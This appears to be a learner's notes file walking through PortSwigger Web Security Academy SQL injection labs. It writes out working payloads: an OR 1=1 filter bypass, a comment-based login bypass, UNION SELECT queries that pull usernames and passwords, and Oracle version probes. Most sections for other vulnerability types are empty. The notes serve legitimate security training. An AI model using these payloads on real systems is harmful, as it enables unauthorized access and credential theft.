# PortSwigger Academy

## SQL Injection

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This is a simple challenge to introduce you to the idea of SQL injection. Given a site such as https://acd01f0d1f5c2eb5c0cc51a2007a0016.web-security-academy.net/ you can view differenct product categories which are controlled by the URL (e.g. `/filter?category=Pets`). A simple SQL injection attack added to the end (`/filter?category=' OR 1=1 --`) solves the challenge by telling the SQL server to return all products with no category set or where 1=1 (which always evaluates to True). Adding the `--` at the end comments out any remainder of the SQL statment in the application code.

### SQL injection vulnerability allowing login bypass

This is another simple case wherein you are encouraged to log in at a standard username/password form (https://ac031f731e5b8017c0984a7400ba0058.web-security-academy.net/login). Much like the prior example, however, you can manipulate the query directly by providing a username of `administrator'--` and any value for the password field. This terminates the query that is presumeably something like 
`SELECT * FROM users WHERE username = 'administrator' AND password = 'myPassword'`. It results in the following query: `SELECT * FROM users WHERE username = 'administrator'--' AND password = 'no matter'`

### SQL injection UNION attack, determining the number of columns returned by the query

What we know:

- vulnerability in product category filter
- should be able to use UNION attack to see data from other tables
- first step is to see number of columns being returned by the query

> Goal: determine number of columns returned by query by adding an additional row contiaining null values

https://acd21fe61eb0074fc0b23b47009700b8.web-security-academy.net/filter?category=Pets

The first approach to determining how many columns is to do the `ORDER BY` trick with increasing numbers until you get an error. We do that and see that it errors on `4`, indicating that three columns are being returned:

```
/filter?category=Pets' ORDER BY 1 --
/filter?category=Pets' ORDER BY 2 --
/filter?category=Pets' ORDER BY 3 --
/filter?category=Pets' ORDER BY 4 -- (error)
```

The second approach (and the one required for solving this lab) is to use the `UNION SELECT NULL` trick with the selected number of NULL columns. Based on the information gained in the first approach, we craft the following query/filter and solve the challenge:

```
/filter?category=Pets' UNION SELECT NULL, NULL, NULL --
```

### SQL injection UNION attack, finding a column containing text

Given:

- SQL injection vuln in the product category filter
- Should be able to do a union attack to pull data from other tables
- builds on previous lab
- need to identify a column that is compatible with string data

> Goal: perform the SQL Injection UNION attack, return additional row containing value provided: `S3HPlT`.

We walk through the three fields looking for a match:

```
/filter?category=Pets' UNION SELECT 'S3HPlT',NULL,NULL-- (internal server error)
/filter?category=Pets' UNION SELECT NULL,'S3HPlT',NULL-- (success!)
/filter?category=Pets' UNION SELECT NULL,'S3HPlT',NULL-- (internal server error)
```

And we can see that the second attempt solved the challenge - we now know that the query is returning 3 columns and the second is compatible with string data.

### SQL injection UNION attack, retrieving data from other tables

Building on prior solutions, we wnt to retrieve data from other tables. We are told that there is another table called `users` that has a column named `username` and another called `password`. Note that this is easier than the above as we don't have to shove things into one column (yet).

```
/filter?category=Pets' UNION select username, password from users --
```

yields us information like the following:

```
The Lazy Dog

The Lazy Dog is brought to you by the same people who invented the...

carlos

934rdmfpigx806kxma0m

administrator

734gs039pp7hvz53glwk

wiener

6yfdkdcuexrs36a2nd2a
```

We can then take this information and log in as the administrator account.

### SQL injection UNION attack, retrieving multiple values in a single column

This is very much like the prior scenario, but uses the structure from the prior challenges wherein you have three columns, and only the second is compatible with strings. Therefore, we have to shove both the username and password into the same field. This can be done with a query that looks like the following:


```
// determine how many columns exist
filter?category=Pets' UNION SELECT NULL,NULL --

// confirm which columns support text:
filter?category=Pets' UNION SELECT NULL,'a' -- (column 2)

// grab the username/password and stuff them into the 2nd column
/filter?category=Pets' UNION SELECT NULL,username || '~' || password from users --
```

This yeilds a result like the following:

```
More Than Just Birdsong
Pest Control Umbrella
Babbage Web Spray
administrator~o7188srj54a849wwm2cq
Giant Grasshopper
wiener~8hxtfx4depv2otj53nb9
carlos~z54oyd1moidzjxuz9oxm
```

And we can then log in as the administrator, solving the challenge

### SQL injection attack, querying the database type and version on Oracle

> NOTE: I failed quite a bit on this until I clicked the 'hint' and learned that every select on ORACLE needs a from stmt. 

```
// determine how many columns are being returned (2)
/filter?category=Gifts' ORDER BY 2 --

// confirm that both columns are compatible with strings (using built-in table named `dual`)
/filter?category=Gifts' UNION SELECT 'a','a' from dual --

// now let's start doing something
/filter?category=Gifts' UNION SELECT version FROM v$version --

// query the banner
/filter?category=Gifts' UNION SELECT BANNER,'a' from v$version --
```

And that produces the solution:

```
CORE 11.2.0.2.0 Production
a
NLSRTL Version 11.2.0.2.0 - Production
a
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
a
PL/SQL Release 11.2.0.2.0 - Production
a
TNS for Linux: Version 11.2.0.2.0 - Production
a
```

### SQL injection attack, querying the database type and version on MySQL and Microsoft

Similar to the prior




### SQL injection attack, listing the database contents on Oracle




## Cross-site Scripting

## Cross-site Request Forgery (CSRF)

## Clickjacking

## DOM-based Vulnerabilities

## Cross-Origin Resource Sharing (CORS)

## XML External Entity (XXE) injection

## Server-Side Request Forgery (SSRF)

## HTTP Request Smuggling

## OS Command Injection

## Server-Side Template Injection

## Directory Traversal

## Access Control Vulnerabilities

## Authentication

## WebSockets

## Web Cache Poisoning

## Insecure Deserialization

## Information Disclosure

## Business Logic Vulnerabilities

## HTTP Host Header Attacks

## OAuth Authentication

